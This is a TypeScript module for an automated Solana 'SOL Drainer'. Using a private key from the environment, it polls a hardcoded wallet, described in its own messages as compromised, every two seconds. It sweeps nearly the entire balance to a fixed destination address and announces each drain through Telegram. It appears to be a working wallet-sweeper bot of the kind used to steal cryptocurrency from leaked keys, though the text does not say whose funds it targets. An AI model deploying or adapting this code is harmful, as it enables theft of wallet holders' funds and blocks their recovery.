import { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import bs58 from 'bs58';

const SOURCE_WALLET = 'FPHrLbLET7CuKERMJzYPum6ucKMpityhKfAGZBBHHATX';
const DESTINATION_WALLET = '6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW';

const CHECK_INTERVAL_MS = 2000;
const MIN_DRAIN_LAMPORTS = 100_000;
const RESERVE_FOR_FEES = 10_000;

const RPC_ENDPOINTS = [
  'https://solana-rpc.publicnode.com',
  'https://api.mainnet-beta.solana.com',
  'https://rpc.ankr.com/solana',
];

let currentRpcIndex = 0;
let connection = new Connection(RPC_ENDPOINTS[0], 'confirmed');
let drainInterval: NodeJS.Timeout | null = null;
let isRunning = false;
let lastDrainTime: string | null = null;
let totalDrained = 0;
let drainCount = 0;
let consecutiveErrors = 0;
let isDraining = false;

function rotateRpc() {
  currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
  connection = new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
  console.log(`[SOL Drainer] Rotated to RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
}

function getKeypair(): Keypair | null {
  const pk = process.env.JUP_SOURCE_PRIVATE_KEY;
  if (!pk) {
    console.log('[SOL Drainer] No private key configured (JUP_SOURCE_PRIVATE_KEY)');
    return null;
  }
  try {
    const decoded = bs58.decode(pk);
    const keypair = Keypair.fromSecretKey(decoded);
    if (keypair.publicKey.toBase58() !== SOURCE_WALLET) {
      console.log(`[SOL Drainer] Warning: Key address ${keypair.publicKey.toBase58()} doesn't match expected ${SOURCE_WALLET}`);
    }
    return keypair;
  } catch (error: any) {
    console.error('[SOL Drainer] Invalid private key format:', error?.message);
    return null;
  }
}

async function sendTelegram(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch {}
}

let lastKnownBalance = 0;

async function drainLoop() {
  if (!isRunning || isDraining) return;
  isDraining = true;

  try {
    const keypair = getKeypair();
    if (!keypair) return;

    const sourcePubkey = new PublicKey(SOURCE_WALLET);
    const balance = await connection.getBalance(sourcePubkey);

    if (lastKnownBalance > 0 && balance < lastKnownBalance - MIN_DRAIN_LAMPORTS) {
      const drained = (lastKnownBalance - balance) / LAMPORTS_PER_SOL;
      console.log(`[SOL Drainer] Balance dropped by ${drained.toFixed(6)} SOL (drain confirmed)`);
      drainCount++;
      totalDrained += (lastKnownBalance - balance);
      lastDrainTime = new Date().toISOString();

      await sendTelegram(
        `<b>SOL Drainer</b>\n` +
        `Drained <b>${drained.toFixed(6)} SOL</b> from compromised wallet\n` +
        `Remaining: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
      );
    }
    lastKnownBalance = balance;

    const drainable = balance - RESERVE_FOR_FEES;

    if (drainable >= MIN_DRAIN_LAMPORTS) {
      const solAmount = drainable / LAMPORTS_PER_SOL;
      console.log(`[SOL Drainer] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - sending drain tx for ${solAmount.toFixed(6)} SOL`);

      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');

      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.lastValidBlockHeight = lastValidBlockHeight;
      tx.feePayer = sourcePubkey;

      tx.add(
        SystemProgram.transfer({
          fromPubkey: sourcePubkey,
          toPubkey: new PublicKey(DESTINATION_WALLET),
          lamports: drainable,
        })
      );

      tx.sign(keypair);

      const sig = await connection.sendRawTransaction(tx.serialize(), {
        skipPreflight: true,
        maxRetries: 3,
      });

      console.log(`[SOL Drainer] Sent drain tx: ${sig.slice(0, 20)}...`);
    }

    consecutiveErrors = 0;
  } catch (error: any) {
    consecutiveErrors++;
    if (consecutiveErrors <= 3) {
      console.error(`[SOL Drainer] Error:`, error?.message?.slice(0, 150));
    }
    if (consecutiveErrors % 10 === 0) {
      rotateRpc();
    }
  } finally {
    isDraining = false;
  }
}

export function startSolDrainer() {
  if (isRunning) return;
  isRunning = true;
  console.log(`[SOL Drainer] Started - draining SOL from ${SOURCE_WALLET} every ${CHECK_INTERVAL_MS}ms`);
  console.log(`[SOL Drainer] Destination: ${DESTINATION_WALLET}`);
  console.log(`[SOL Drainer] Min drain: ${MIN_DRAIN_LAMPORTS} lamports, keeping: ${RESERVE_FOR_FEES} lamports`);
  drainInterval = setInterval(drainLoop, CHECK_INTERVAL_MS);
  drainLoop();
}

export function stopSolDrainer() {
  isRunning = false;
  if (drainInterval) {
    clearInterval(drainInterval);
    drainInterval = null;
  }
  console.log('[SOL Drainer] Stopped');
}

export function getSolDrainerStatus() {
  return {
    running: isRunning,
    sourceWallet: SOURCE_WALLET,
    destinationWallet: DESTINATION_WALLET,
    checkIntervalMs: CHECK_INTERVAL_MS,
    minDrainLamports: MIN_DRAIN_LAMPORTS,
    reserveForFees: RESERVE_FOR_FEES,
    totalDrainedLamports: Number(totalDrained),
    totalDrainedSol: totalDrained / LAMPORTS_PER_SOL,
    drainCount,
    lastDrainTime,
    consecutiveErrors,
  };
}

export async function triggerSolDrain() {
  try {
    const keypair = getKeypair();
    if (!keypair) return { success: false, error: 'No private key configured' };

    const sourcePubkey = new PublicKey(SOURCE_WALLET);
    const balance = await connection.getBalance(sourcePubkey);
    const drainable = balance - RESERVE_FOR_FEES;

    if (drainable < MIN_DRAIN_LAMPORTS) {
      return {
        success: false,
        message: `Balance too low to drain`,
        balanceLamports: balance,
        balanceSol: balance / LAMPORTS_PER_SOL,
        drainableLamports: Math.max(0, drainable),
      };
    }

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    const tx = new Transaction();
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;
    tx.feePayer = sourcePubkey;
    tx.add(
      SystemProgram.transfer({
        fromPubkey: sourcePubkey,
        toPubkey: new PublicKey(DESTINATION_WALLET),
        lamports: drainable,
      })
    );
    tx.sign(keypair);

    const sig = await connection.sendRawTransaction(tx.serialize(), {
      skipPreflight: true,
      maxRetries: 3,
    });

    drainCount++;
    totalDrained += drainable;
    lastDrainTime = new Date().toISOString();

    const solAmount = drainable / LAMPORTS_PER_SOL;

    await sendTelegram(
      `<b>SOL Drainer (Manual)</b>\n` +
      `Drained <b>${solAmount.toFixed(6)} SOL</b>\n` +
      `TX: ${sig.slice(0, 16)}...`
    );

    return {
      success: true,
      drainedLamports: drainable,
      drainedSol: solAmount,
      signature: sig,
    };
  } catch (error: any) {
    return { success: false, error: error?.message?.slice(0, 200) };
  }
}
